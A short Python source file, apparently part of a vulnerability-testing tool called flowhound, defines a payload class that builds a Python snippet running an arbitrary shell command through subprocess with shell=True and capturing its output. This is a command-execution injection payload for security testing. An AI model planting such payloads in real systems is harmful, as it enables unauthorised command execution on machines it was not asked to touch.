from flowhound.vulnerabilities.payloads.base_payload_class import PayloadBaseClass


class Payload(PayloadBaseClass):

    def __init__(self, cmd: str):
        self.payload = self.generate_payload(cmd=cmd)

    def generate_payload(self, cmd: str) -> str:
        return (
            "import subprocess as _sp\n"
            f"_out = _sp.check_output({cmd!r}, shell=True, stderr=_sp.STDOUT)"
            ".decode(errors='replace').strip()\n"
        )

    def load_payload(self) -> str:
        return self.payload
